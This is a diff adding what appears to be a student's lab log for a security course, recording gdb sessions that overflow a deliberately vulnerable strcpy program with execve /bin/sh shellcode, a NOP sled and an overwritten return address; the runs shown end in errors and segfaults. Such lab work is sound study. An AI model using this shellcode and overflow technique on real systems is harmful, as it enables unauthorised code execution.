@@ -1,0 +1,146 @@
+buffer addr = 0xbfffef48
+
+payload command =  run $(python -c 'print("\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x90"*76 + "\x90"*4 + "\x48\xef\xff\xbf")')
+
+user@user-VirtualBox:~/Documents/ENPM-691/C Programs$ gcc strcpy.c -o strcpy -mpreferred-stack-boundary=2 -fno-stack-protector -zexecstack -g
+user@user-VirtualBox:~/Documents/ENPM-691/C Programs$ cat strcpy.c
+#include<stdio.h>
+#include<string.h>
+
+void getdata(char* str) 
+{
+	//int a = 10;
+	//int b = 20;
+	//short c = 30;
+	char buffer[100];
+	strcpy(buffer, str);
+	puts(buffer);
+}
+
+int main(int argc, char** argv) 
+{
+	getdata(argv[1]);
+	return 0;
+}
+user@user-VirtualBox:~/Documents/ENPM-691/C Programs$ cat shellcode.txt
+\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x6s\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80
+user@user-VirtualBox:~/Documents/ENPM-691/C Programs$ gdb strcpy -q
+Reading symbols from strcpy...done.
+(gdb) disass getdata
+Dump of assembler code for function getdata:
+   0x0804843b <+0>:	push   %ebp
+   0x0804843c <+1>:	mov    %esp,%ebp
+   0x0804843e <+3>:	sub    $0x64,%esp
+   0x08048441 <+6>:	pushl  0x8(%ebp)
+   0x08048444 <+9>:	lea    -0x64(%ebp),%eax
+   0x08048447 <+12>:	push   %eax
+   0x08048448 <+13>:	call   0x8048300 <strcpy@plt>
+   0x0804844d <+18>:	add    $0x8,%esp
+   0x08048450 <+21>:	lea    -0x64(%ebp),%eax
+   0x08048453 <+24>:	push   %eax
+   0x08048454 <+25>:	call   0x8048310 <puts@plt>
+   0x08048459 <+30>:	add    $0x4,%esp
+   0x0804845c <+33>:	nop
+   0x0804845d <+34>:	leave  
+   0x0804845e <+35>:	ret    
+End of assembler dump.
+(gdb) b *0x08048447
+Breakpoint 1 at 0x8048447: file strcpy.c, line 10.
+(gdb) run $(python -c 'print("A"*100)')
+Starting program: /home/user/Documents/ENPM-691/C Programs/strcpy $(python -c 'print("A"*100)')
+
+Breakpoint 1, 0x08048447 in getdata (str=0xbffff250 'A' <repeats 100 times>)
+    at strcpy.c:10
+10		strcpy(buffer, str);
+(gdb) print /x $eax
+$1 = 0xbfffef48
+(gdb) kill
+Kill the program being debugged? (y or n) y
+(gdb) run $(python -c 'print("A"*100)')
+Starting program: /home/user/Documents/ENPM-691/C Programs/strcpy $(python -c 'print("A"*100)')
+
+Breakpoint 1, 0x08048447 in getdata (str=0xbffff250 'A' <repeats 100 times>)
+    at strcpy.c:10
+10		strcpy(buffer, str);
+(gdb) print /x $eax
+$2 = 0xbfffef48
+(gdb) kill
+Kill the program being debugged? (y or n) y
+(gdb) run $(python -c 'print("\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x6s\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80"*100 + "")')
+Starting program: /home/user/Documents/ENPM-691/C Programs/strcpy $(python -c 'print("\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x6s\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80"*100 + "")')
+ValueError: invalid \x escape
+
+Breakpoint 1, 0x08048447 in getdata (str=0x0) at strcpy.c:10
+10		strcpy(buffer, str);
+(gdb) run $(python -c 'print("\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x6s\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x90"*76 + "\x90"*4 + "\x48\xef\xff\xbf")')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/user/Documents/ENPM-691/C Programs/strcpy $(python -c 'print("\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x6s\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x90"*76 + "\x90"*4 + "\x48\xef\xff\xbf")')
+ValueError: invalid \x escape
+
+Breakpoint 1, 0x08048447 in getdata (str=0x0) at strcpy.c:10
+10		strcpy(buffer, str);
+(gdb) quit
+A debugging session is active.
+
+	Inferior 1 [process 16939] will be killed.
+
+Quit anyway? (y or n) y
+user@user-VirtualBox:~/Documents/ENPM-691/C Programs$ gdb strcpy -q
+Reading symbols from strcpy...done.
+(gdb) disass getdata
+Dump of assembler code for function getdata:
+   0x0804843b <+0>:	push   %ebp
+   0x0804843c <+1>:	mov    %esp,%ebp
+   0x0804843e <+3>:	sub    $0x64,%esp
+   0x08048441 <+6>:	pushl  0x8(%ebp)
+   0x08048444 <+9>:	lea    -0x64(%ebp),%eax
+   0x08048447 <+12>:	push   %eax
+   0x08048448 <+13>:	call   0x8048300 <strcpy@plt>
+   0x0804844d <+18>:	add    $0x8,%esp
+   0x08048450 <+21>:	lea    -0x64(%ebp),%eax
+   0x08048453 <+24>:	push   %eax
+   0x08048454 <+25>:	call   0x8048310 <puts@plt>
+   0x08048459 <+30>:	add    $0x4,%esp
+   0x0804845c <+33>:	nop
+   0x0804845d <+34>:	leave  
+   0x0804845e <+35>:	ret    
+End of assembler dump.
+(gdb) b *0x08048447
+Breakpoint 1 at 0x8048447: file strcpy.c, line 10.
+(gdb) quit
+user@user-VirtualBox:~/Documents/ENPM-691/C Programs$ gdb strcpy -q
+Reading symbols from strcpy...done.
+(gdb) run $(python -c 'print("\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x6s\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x90"*76 + "\x90"*4 + "\x48\xef\xff\xbf")')
+Starting program: /home/user/Documents/ENPM-691/C Programs/strcpy $(python -c 'print("\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x6s\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x90"*76 + "\x90"*4 + "\x48\xef\xff\xbf")')
+ValueError: invalid \x escape
+
+Program received signal SIGSEGV, Segmentation fault.
+__strcpy_sse2 () at ../sysdeps/i386/i686/multiarch/strcpy-sse2.S:1616
+1616	../sysdeps/i386/i686/multiarch/strcpy-sse2.S: No such file or directory.
+(gdb) run $(python -c 'print("\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x90"*76 + "\x90"*4 + "\x48\xef\xff\xbf")')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/user/Documents/ENPM-691/C Programs/strcpy $(python -c 'print("\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x90"*76 + "\x90"*4 + "\x48\xef\xff\xbf")')
+1�Phn/shh//bi���RS���
+                     ��������������������������������������������������������������������������������H���
+
+Program received signal SIGSEGV, Segmentation fault.
+0xbfffef9c in ?? ()
+(gdb) quit
+A debugging session is active.
+
+	Inferior 1 [process 16966] will be killed.
+
+Quit anyway? (y or n) y
+user@user-VirtualBox:~/Documents/ENPM-691/C Programs$ gdb strcpy -q
+Reading symbols from strcpy...done.
+(gdb) run $(python -c 'print("\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x90"*76 + "\x90"*4 + "\x48\xef\xff\xbf")')
+Starting program: /home/user/Documents/ENPM-691/C Programs/strcpy $(python -c 'print("\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x90"*76 + "\x90"*4 + "\x48\xef\xff\xbf")')
+1�Phn/shh//bi���RS���
+                     ��������������������������������������������������������������������������������H���
+
+Program received signal SIGSEGV, Segmentation fault.
+0xbfffef9c in ?? ()
+(gdb) 
+
